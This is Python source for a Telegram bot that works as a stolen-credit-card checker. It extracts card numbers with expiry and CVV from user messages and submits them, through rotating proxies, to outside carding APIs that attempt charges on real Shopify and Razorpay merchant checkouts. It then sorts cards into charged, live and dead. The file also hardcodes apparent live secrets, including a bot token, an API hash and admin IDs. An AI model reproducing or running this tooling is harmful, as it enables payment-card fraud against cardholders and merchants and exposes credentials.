from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import sqlite3
import random
import time
import re
import json
import pytz
from datetime import datetime
from telethon.errors import FloodWaitError
from PIL import Image, ImageDraw, ImageFont

# Premium Custom Emoji IDs
PREMIUM_EMOJI_IDS = {
    "✅": "6298612102709909362",
    "❌": "6206110936789423908",
    "⚡": "6026367225466720832",
    "💠": "5971837723676249096",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "5462902520215002477",
    "🔥": "5267500801240092311",
    "💰": "6190336264940559752",
    "💵": "6206155797722830770",
    "✔️": "6206479140040743133",
    "⭐": "5267500801240092311",
    "💳": "5472250091332993630",
    "🏧": "4967738760021148319",
    "☄️": "5041992177563993101",
    "🫥": "5325731315004218660",
    "⚡️": "5042334757040423886",
    "👑": "5039727497143387500",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

SHOPIFY_APIS = [
    "http://shopii-api-production.up.railway.app/shopify",
]

API_ID = 32674887
API_HASH = '1e7027eebd6f97d46b7ed6eac6d7137c'
BOT_TOKEN = '9133225087:AAFpmv4jk3LUMfL5dWnGUAd9jv5eLq3L4uE'
ADMIN_ID = 1293174588
KEY_ADMINS = {1293174588}

# File paths
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
USER_SITES_FILE = 'user_sites.json'
RZ_SITES_FILE = 'rz_sites.txt'
PHOTO_URL = "https://i.postimg.cc/NMfk3jpP/Leo4youh.png"

# Initialize bot
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

RAZORPAY_FIXED_SITE = "https://pages.razorpay.com/BusinessGarh?fbclid=PAAaYBPBDRDVaPZMu7kXaq1a2mNOIiXxEJ1usxIxxdbAJYt3q75QWhHXFZeh8_aem_AXQuIpg6pqBI2mXplIaDgYU0ztY4jF0C97qV1RPZF6WzfWeZy93K9u0Gv1wbTWYDpRs%20Ye%20lagan%20he%20to/pl_Eg24W0HLznkELl/view"
RAZORPAY_API_BASE = "https://auto-razorpay-nano.vercel.app/hit"

active_sessions = {}

async def send_to_chat(chat_id, text, **kwargs):
    try:
        await bot.send_message(chat_id, text, **kwargs)
    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s - waiting...")
        await asyncio.sleep(e.seconds)
        await bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        print(f"Send to chat error: {e}")
        try:
            await bot.send_message(chat_id, text, **kwargs)
        except:
            pass

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def load_razorpay_sites():
    return [RAZORPAY_FIXED_SITE]

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def is_admin(user_id):
    return user_id == ADMIN_ID or user_id in KEY_ADMINS

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def create_result_card():
    img = Image.new("RGB", (800, 600), "#111827")
    draw = ImageDraw.Draw(img)
    alone_font = ImageFont.truetype("DejaVuSans.ttf", 70)
    draw.text(
        (80, 250),
        "Unlimited Checker",
        font=alone_font,
        fill=(0, 200, 255)
    )
    img.save("result_card.png")

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(msg):
    if not msg:
        return True
    msg = str(msg).lower()
    return any(x in msg for x in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

API_FAIL_COUNT = 0
API_FAIL_LOCK = asyncio.Lock()

async def check_card(card, site, proxy):
    global API_FAIL_COUNT

    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                'status': 'Site Error',
                'message': 'Invalid card format',
                'card': card,
                'site': site,
                'gateway': 'Unknown',
                'price': '-',
                'retry': True
            }

        if not site.startswith("http"):
            site = f"https://{site}"

        api_url = random.choice(SHOPIFY_APIS)
        url = f"{api_url}?site={site}&cc={card}&proxy={proxy}"

        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)

        response_msg = str(raw.get('Response', '')).strip()
        price = raw.get('Price', '-')
        gate = raw.get('Gateway', raw.get('Gate', '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮'))
        status = raw.get('Status', '')
        api_status = raw.get('Status', False)
        response_lower = response_msg.lower()

        SITE_DEAD_TRIGGERS = [
            "request timeout", "timeout", "connection failed", "connection reset",
            "connection refused", "timed out", "site error", "site dead",
            "cloudflare", "cloudflare bypass failed", "captcha_required",
            "captcha required", "invalid url", "error in 1st req",
            "error in 1 req", "access denied", "tlsv1 alert", "ssl routines",
            "could not resolve", "domain name not found", "name or service not known",
            "openssl ssl_connect", "empty reply from server", "httperror504",
            "http error", "unreachable", "ssl error", "502", "503", "504",
            "bad gateway", "service unavailable", "gateway timeout",
            "network error", "failed to detect product", "failed to create checkout",
            "failed to tokenize card", "failed to get proposal data",
            "submit rejected", "submit rejected:", "handle error", "http 404",
            "delivery_delivery_line_detail_changed", "delivery_address2_required",
            "url rejected", "malformed input", "amount_too_small",
            "amount too small", "all products sold out", "no_session_token",
            "tokenize_fail", "merchandise_expected_price_mismatch",
            "payments_credit_card_generic",
            "payments_payment_flexibility_terms_id_mismatch",
            "failed to get session token", "no valid payment method found",
            "unable to get payment token", "cart failed with status 503",
            "invalid json response", "expecting value", "site not supported",
            "no valid products", "product price too high", "site requires login",
            "proxy error", "status: 4", "site dead", "error processing card",
            "generic_error", "validation_custom", "429", "rate limit",
            "too many requests"
        ]

        if any(x in response_lower for x in SITE_DEAD_TRIGGERS):
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
                print(f"⚠️ API Fail #{API_FAIL_COUNT} — {site[:50]}")

            return {
                "status": "Site Error",
                "message": response_msg[:150] if response_msg else "Site Error",
                "card": card,
                "retry": True,
                "gateway": gate,
                "price": price,
                "site": site
            }

        async with API_FAIL_LOCK:
            if API_FAIL_COUNT > 0:
                print(f"✅ API Success — Reset count from {API_FAIL_COUNT} to 0")
                API_FAIL_COUNT = 0

        is_rz = "razorpay" in gate.lower() or "rz" in gate.lower()
        if not is_rz:
            try:
                price_value = float(str(price).replace("$", "").replace("₹", "").strip())
                if price_value > 30:
                    return {
                        "status": "Site Error",
                        "message": f"Price ${price_value} > $30",
                        "card": card,
                        "retry": True,
                        "gateway": gate,
                        "price": price,
                        "site": site
                    }
            except:
                pass

        CHARGED_TRIGGERS = [
            "charged", "order completed", "order_placed", "order_paid",
            "insufficient_funds", "thank you", "payment successful", "💎"
        ]

        if status == "Charged" or any(x in response_lower for x in CHARGED_TRIGGERS):
            return {
                'status': 'Charged',
                'message': response_msg[:150] if response_msg else "Charged",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        APPROVED_TRIGGERS = [
            'otp_required', 'approved', 'success', 'invalid_cvv',
            'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc',
            'incorrect cvc', 'incorrect_zip', 'incorrect zip'
        ]

        if status == 'Approved' or any(x in response_lower for x in APPROVED_TRIGGERS):
            return {
                'status': 'Approved',
                'message': response_msg[:150] if response_msg else "Approved",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        if "card_declined" in response_lower or "declined" in response_lower:
            return {
                'status': 'Dead',
                'message': response_msg[:150] if response_msg else "CARD_DECLINED",
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }

        if not api_status:
            async with API_FAIL_LOCK:
                API_FAIL_COUNT += 1
                print(f"⚠️ API Fail #{API_FAIL_COUNT} (Status False) — {site[:50]}")

            return {
                'status': 'Site Error',
                'message': response_msg[:150] if response_msg else "API Status False",
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }

        return {
            'status': 'Site Error',
            'message': response_msg[:150] if response_msg else "Unknown Error",
            'card': card,
            'retry': True,
            'gateway': gate,
            'price': price,
            'site': site
        }

    except asyncio.TimeoutError:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
            print(f"⚠️ API Fail #{API_FAIL_COUNT} (Timeout) — {site[:50]}")

        return {
            'status': 'Site Error',
            'message': 'Request timeout',
            'card': card,
            'retry': True,
            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
            'price': '-',
            'site': site
        }

    except json.JSONDecodeError as e:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
            print(f"⚠️ API Fail #{API_FAIL_COUNT} (JSON Error) — {site[:50]}")

        return {
            'status': 'Site Error',
            'message': f'Invalid JSON: {str(e)[:50]}',
            'card': card,
            'retry': True,
            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
            'price': '-',
            'site': site
        }

    except Exception as e:
        async with API_FAIL_LOCK:
            API_FAIL_COUNT += 1
            print(f"⚠️ API Fail #{API_FAIL_COUNT} (Exception) — {site[:50]}")

        return {
            'status': 'Site Error',
            'message': f'Error: {str(e)[:80]}',
            'card': card,
            'retry': True,
            'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
            'price': '-',
            'site': site
        }

async def check_card_with_retry(card, sites, proxies, max_retries=20):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}

    used_sites = set()
    used_proxies = set()

    for attempt in range(max_retries):
        available_sites = [s for s in sites if s not in used_sites]
        if not available_sites:
            break
        site = random.choice(available_sites)
        used_sites.add(site)

        available_proxies = [p for p in proxies if p not in used_proxies]
        if not available_proxies:
            break
        proxy = random.choice(available_proxies)
        used_proxies.add(proxy)

        result = await check_card(card, site, proxy)
        result['site'] = site

        if not result.get('retry'):
            return result

        if attempt < max_retries - 2:
            await asyncio.sleep(0.5)

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮', 'price': '-', 'site': None}

async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", is_razorpay=False):
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    current_time = now.strftime("%I:%M:%S %p IST")

    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    dead = len(results.get('dead', []))
    errors = results.get('errors', 0)
    total = results.get('total', 0)
    checked = current_attempt_count

    gateway = "𝙍𝘼𝙕𝙊𝙍𝙋𝘼𝙔" if is_razorpay else "𝙎𝙃𝙊𝙋𝙄𝙁𝙔"

    text = f"""<b>⚡ 𝙎𝙝𝙤𝙥𝙞𝙞 𝙓 𝙍𝙯𝙧 ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💠 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ {gateway}</b>
<b>🔄 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚...</b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 ➜ {checked}/{total}</b>
<b>🔥 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ➜ {approved}</b>
<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ➜ {charged}</b>
<b>❌ 𝗗𝗘𝗔𝗗 ➜ {dead}</b>
<b>⚠️ 𝗘𝗥𝗥𝗢𝗥𝗦 ➜ {errors}</b>
<b>⏳ 𝗧𝗜𝗠𝗘 ➜ {current_time}</b>  
━━━━━━━━━━━━━━━━━━━━
<b>👑 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ <a href="tg://user?id={user_id}">{first_name}</a></b>"""

    buttons = [
        [
            Button.inline(f"🔥 𝗟𝗶𝘃𝗲 ({approved})", b"live"),
            Button.inline(f"💎 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ({charged})", b"charged")
        ],
        [
            Button.inline(f"❌ 𝗗𝗲𝗮𝗱 ({dead})", b"dead"),
            Button.inline("🛑 𝗦𝘁𝗼𝗽", f"stop_{message_id}".encode())
        ]
    ]

    try:
        await bot.edit_message(
            user_id,
            message_id,
            premium_emoji(text),
            buttons=buttons,
            parse_mode="html"
        )
    except Exception:
        pass

async def check_one_site(session, site):
    try:
        if not site.startswith("http"):
            site = "https://" + site
        async with session.get(site, allow_redirects=True) as resp:
            if resp.status < 500:
                return site, True
            return site, False
    except:
        return site, False

async def fast_site_check(sites):
    timeout = aiohttp.ClientTimeout(total=8)
    connector = aiohttp.TCPConnector(limit=50, ssl=False)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [check_one_site(session, site) for site in sites]
        results = await asyncio.gather(*tasks)

    alive = []
    dead = 0
    for site, ok in results:
        if ok:
            alive.append(site)
        else:
            dead += 1
    return alive, dead

async def check_card_razorpay(card, proxy, amount=1):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

        site = RAZORPAY_FIXED_SITE
        base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount={amount}&cc={card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=30)

        for attempt in range(60):
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(base_url, ssl=False) as resp:
                        raw_text = (await resp.text()).strip()

                if not raw_text or len(raw_text) < 5:
                    if attempt < 59:
                        await asyncio.sleep(0.8 + (attempt * 0.15))
                        continue
                    return {'status': 'Dead', 'message': 'Empty Response', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                if raw_text.startswith('<') or not raw_text.startswith('{'):
                    if attempt < 59:
                        await asyncio.sleep(1.2 + (attempt * 0.2))
                        continue
                    return {'status': 'Dead', 'message': f'Bad Response: {raw_text[:80]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                raw = None
                for json_attempt in range(16):
                    try:
                        raw = json.loads(raw_text)
                        break
                    except json.JSONDecodeError as je:
                        if attempt < 59 and json_attempt < 15:
                            await asyncio.sleep(0.6)
                            async with aiohttp.ClientSession(timeout=timeout) as session:
                                async with session.get(base_url, ssl=False) as retry_resp:
                                    raw_text = (await retry_resp.text()).strip()
                            continue
                        else:
                            if attempt < 59:
                                await asyncio.sleep(1.0 + attempt * 0.1)
                                continue
                            return {'status': 'Dead', 'message': f'Invalid JSON: {str(je)[:80]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                if raw is None:
                    continue

                response_msg = str(raw.get('response', raw.get('Response', raw.get('message', '')))).strip()
                price = str(raw.get('Price', amount))
                status_str = str(raw.get('status', raw.get('success', ''))).lower()
                gate = "Razorpay"

                if any(x in status_str for x in ["charged", "success", "true"]) or any(x in response_msg.lower() for x in ["charged", "order completed", "order_placed", "order_paid", "insufficient_funds", "thank you", "payment successful"]):
                    return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
                elif any(x in status_str for x in ["approved", "success"]) or "otp" in response_msg.lower():
                    return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
                else:
                    return {'status': 'Dead', 'message': response_msg or "DECLINED", 'card': card, 'site': site, 'gateway': gate, 'price': price}

            except asyncio.TimeoutError:
                if attempt < 59:
                    await asyncio.sleep(2.0 + attempt * 0.2)
                    continue
                return {'status': 'Dead', 'message': 'Timeout', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

            except Exception as e:
                error_str = str(e).lower()
                if "expecting value" in error_str or "json" in error_str or "connection" in error_str:
                    if attempt < 59:
                        await asyncio.sleep(1.3 + (attempt * 0.18))
                        continue
                if attempt < 59:
                    await asyncio.sleep(1.0)
                    continue
                return {'status': 'Dead', 'message': f'Error: {str(e)[:120]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

        return {'status': 'Dead', 'message': 'Max 60 retries exceeded', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

    except Exception as e:
        return {'status': 'Dead', 'message': f'Outer Error: {str(e)[:100]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

# ==================== USER SITE FUNCTIONS ====================
async def load_user_sites():
    if not os.path.exists(USER_SITES_FILE):
        return {}
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

async def save_user_sites(data):
    with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def get_user_sites_sync(user_id):
    if not os.path.exists(USER_SITES_FILE):
        return []
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data.get(str(user_id), [])
    except:
        return []

async def add_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site not in user_sites:
        user_sites.append(site)
        data[str(user_id)] = user_sites
        await save_user_sites(data)
        return True
    return False

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site = "https://riverbendhomedev.myshopify.com"

    try:
        api_url = random.choice(SHOPIFY_APIS)
        url = f"{api_url}?site={test_site}&cc={test_card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)

        response = str(raw.get("Response", "")).lower()

        DEAD = (
            "proxy dead", "invalid proxy format", "no proxy",
            "proxy error", "connection refused", "connection reset",
            "timeout", "timed out", "407", "502", "503", "504",
            "bad gateway", "gateway timeout", "socks error",
            "proxy connection failed", "tunnel connection failed",
            "cannot connect to proxy", "proxy rejected"
        )

        if any(x in response for x in DEAD):
            return {"proxy": proxy, "status": "dead"}
        return {"proxy": proxy, "status": "alive"}
    except:
        return {"proxy": proxy, "status": "dead"}

async def remove_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site in user_sites:
        user_sites.remove(site)
        if user_sites:
            data[str(user_id)] = user_sites
        else:
            data.pop(str(user_id), None)
        await save_user_sites(data)
        return True
    return False

async def clear_user_sites(user_id):
    data = await load_user_sites()
    if str(user_id) in data:
        del data[str(user_id)]
        await save_user_sites(data)
        return True
    return False

def get_checker_sites(user_id):
    user_sites = get_user_sites_sync(user_id)
    if user_sites:
        return user_sites
    return load_sites()

# ==================== /addsites ====================
@bot.on(events.NewMessage(pattern=r'^/addsites\s+(.+)'))
async def add_shopify_site(event):
    user_id = event.sender_id
    site = event.pattern_match.group(1).strip()
    if not site.startswith("http"):
        site = f"https://{site}"

    status_msg = await event.reply(f"🔄 Testing Shopify Site...\n\n<code>{site[:60]}</code>", parse_mode="html")

    proxies = load_proxies()
    if not proxies:
        await status_msg.edit("❌ No proxies available! Use /addproxy first.")
        return

    proxy = random.choice(proxies)
    test_card = "5154623245618097|03|2032|156"
    api_url = random.choice(SHOPIFY_APIS)
    url = f"{api_url}?site={site}&cc={test_card}&proxy={proxy}"

    try:
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)

        response_msg = str(raw.get('Response', '')).lower()
        price = raw.get('Price', '-')

        if is_dead_site_error(response_msg):
            await status_msg.edit(f"❌ Site Dead! Not Added.\n\n<code>{site[:60]}</code>", parse_mode="html")
            return

        if await add_user_site(user_id, site):
            new_count = len(get_user_sites_sync(user_id))
            await status_msg.edit(f"""✅ Site Added to YOUR List!

📊 Your Sites: <code>{new_count}</code>
💰 Price: <code>{price}</code>

💡 /mysites - View | /rmsites url - Remove""", parse_mode="html")
        else:
            await status_msg.edit("⚠️ Already in your list!", parse_mode="html")
    except:
        await status_msg.edit("❌ Test Failed! Not Added.", parse_mode="html")

# ==================== /rmsites ====================
@bot.on(events.NewMessage(pattern=r'^/rmsites\s+(.+)'))
async def remove_shopify_site(event):
    user_id = event.sender_id
    site_to_remove = event.pattern_match.group(1).strip()
    if not site_to_remove.startswith("http"):
        site_to_remove = f"https://{site_to_remove}"

    user_sites = get_user_sites_sync(user_id)
    if not user_sites:
        await event.reply("❌ No sites in your list!\nUse /addsites url to add.", parse_mode="html")
        return

    found = None
    for s in user_sites:
        if site_to_remove in s or s in site_to_remove:
            found = s
            break

    target = found if found else site_to_remove
    if target not in user_sites:
        await event.reply("❌ Site not found in your list!\n\nUse /mysites to view.", parse_mode="html")
        return

    await remove_user_site(user_id, target)
    remaining = len(get_user_sites_sync(user_id))

    await event.reply(f"""✅ Site Removed!

🗑 <code>{target[:50]}</code>
📊 Remaining: <code>{remaining}</code>

💡 /addsites url | /mysites""", parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/site$'))
async def site_check_command(event):
    user_id = event.sender_id

    if is_admin(user_id):
        user_sites = get_user_sites_sync(user_id)
        global_sites = load_sites()
        sites = list(set(user_sites + global_sites))
        site_type = "Admin (Manual + Bot)"
    else:
        sites = get_user_sites_sync(user_id)
        site_type = "Manual"

    if not sites:
        if is_admin(user_id):
            sites = load_sites()
            site_type = "Bot Sites"
        else:
            await event.reply(premium_emoji("""❌ **No sites available!**

📌 **Add your sites first:**
<code>/addsites https://yoursite.com</code>

💡 **Check your sites:**
<code>/mysites</code>"""), parse_mode="html")
            return

    msg = await event.reply(premium_emoji(f"""<b>⚡ Site Checker Started</b>

👤 <b>Mode:</b> {site_type}
📊 <b>Total Sites:</b> <code>{len(sites)}</code>
🔍 <b>Checking...</b>"""), parse_mode="html")

    alive, dead = await fast_site_check(sites)

    if alive:
        txt_file = f"working_sites_{user_id}.txt"
        with open(txt_file, "w") as f:
            f.write("\n".join(alive))
        await bot.send_message(user_id, f"📄 **{len(alive)} Working Sites**", file=txt_file)
        os.remove(txt_file)

    if is_admin(user_id):
        buttons = [
            [
                Button.inline(f"🟢 MY SITES ({len(get_user_sites_sync(user_id))})", b"use_my_sites"),
                Button.inline(f"🔵 BOT SITES ({len(load_sites())})", b"use_global"),
            ],
            [
                Button.inline("🗑 CLEAR MY SITES", b"clear_my_sites"),
            ]
        ]

        await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete</b>

👤 <b>Mode:</b> Admin (Both)
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Working:</b> <code>{len(alive)}</code>
❌ <b>Dead:</b> <code>{len(dead)}</code>
📄 <b>TXT File Sent</b> ✅

<b>👇 Choose which sites to use for checking:</b>"""), buttons=buttons, parse_mode="html")
    else:
        user_count = len(get_user_sites_sync(user_id))
        await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete</b>

👤 <b>Mode:</b> Your Sites
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Working:</b> <code>{len(alive)}</code>
❌ <b>Dead:</b> <code>{len(dead)}</code>
📄 <b>TXT File Sent</b> ✅
━━━━━━━━━━━━━━━━━━━━
📌 <b>Your Sites:</b> <code>{user_count}</code>
💡 <code>/addsites url</code> | <code>/mysites</code>"""), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"use_my_sites"))
async def use_my_sites_handler(event):
    user_id = event.sender_id
    user_sites = get_user_sites_sync(user_id)
    if user_sites:
        await event.answer(f"✅ Using YOUR {len(user_sites)} sites!", alert=True)
    else:
        await event.answer("❌ No personal sites! Using bot sites.", alert=True)

@bot.on(events.CallbackQuery(data=b"use_global"))
async def use_global_handler(event):
    global_sites = load_sites()
    await event.answer(f"✅ Using BOT {len(global_sites)} sites!", alert=True)

@bot.on(events.CallbackQuery(data=b"clear_my_sites"))
async def clear_my_sites_handler(event):
    user_id = event.sender_id
    count = len(get_user_sites_sync(user_id))
    if count > 0:
        await clear_user_sites(user_id)
        await event.answer(f"✅ Cleared {count} sites!", alert=True)
    else:
        await event.answer("❌ No sites to clear!", alert=True)

# ==================== /addsite ====================
@bot.on(events.NewMessage(pattern=r'^/addsite\s+(.+)'))
async def user_add_site(event):
    user_id = event.sender_id
    site = event.pattern_match.group(1).strip()
    if not site.startswith("http"):
        site = f"https://{site}"

    status_msg = await event.reply(premium_emoji(f"🔄 Testing Site...\n\n<code>{site[:60]}</code>"), parse_mode="html")

    proxies = load_proxies()
    if not proxies:
        await status_msg.edit(premium_emoji("❌ No proxies available! Use /addproxy first."), parse_mode="html")
        return

    proxy = random.choice(proxies)
    test_card = "5154623245618097|03|2032|156"
    url = f"http://45.61.54.123:7002/shopify?site={site}&cc={test_card}&proxy={proxy}"

    try:
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)

        response_msg = str(raw.get('Response', '')).lower()
        price = raw.get('Price', '-')

        if is_dead_site_error(response_msg):
            await status_msg.edit(premium_emoji(f"❌ Site Dead! Not Added.\n\n<code>{site[:60]}</code>"), parse_mode="html")
            return

        if await add_user_site(user_id, site):
            new_count = len(get_user_sites_sync(user_id))
            await status_msg.edit(premium_emoji(f"""✅ Site Added to Your List!

📊 Your Sites: <code>{new_count}</code>
💰 Price: <code>{price}</code>

💡 /mysites - View | /rm url - Remove"""), parse_mode="html")
        else:
            await status_msg.edit(premium_emoji("⚠️ Already in your list!"), parse_mode="html")
    except:
        await status_msg.edit(premium_emoji("❌ Test Failed! Not Added."), parse_mode="html")

# ==================== /rm ====================
@bot.on(events.NewMessage(pattern=r'^/rm\s+(.+)'))
async def remove_user_site_cmd(event):
    user_id = event.sender_id
    site_to_remove = event.pattern_match.group(1).strip()
    if not site_to_remove.startswith("http"):
        site_to_remove = f"https://{site_to_remove}"

    user_sites = get_user_sites_sync(user_id)
    if not user_sites:
        await event.reply(premium_emoji("❌ No sites in your list!\nUse /addsite url to add."), parse_mode="html")
        return

    found = None
    for s in user_sites:
        if site_to_remove in s or s in site_to_remove:
            found = s
            break

    target = found if found else site_to_remove
    if target not in user_sites:
        await event.reply(premium_emoji("❌ Site not found!\n\nUse /mysites to view your sites."), parse_mode="html")
        return

    await remove_user_site(user_id, target)
    remaining = len(get_user_sites_sync(user_id))

    await event.reply(premium_emoji(f"""✅ Site Removed!

🗑 <code>{target[:50]}</code>
📊 Remaining: <code>{remaining}</code>

💡 /addsite url | /mysites"""), parse_mode="html")

# ==================== /mysites ====================
@bot.on(events.NewMessage(pattern=r'^/mysites$'))
async def view_user_sites(event):
    user_id = event.sender_id
    user_sites = get_user_sites_sync(user_id)
    global_sites = load_sites()

    if not user_sites:
        await event.reply(premium_emoji(f"""📋 Site Status

🔹 Your Sites: <code>0</code>
🔸 Global Sites: <code>{len(global_sites)}</code>
━━━━━━━━━━━━━━━━━━━━
💡 /addsite url - Add personal site
📋 /site - Check all sites"""), parse_mode="html")
        return

    if len(user_sites) <= 30:
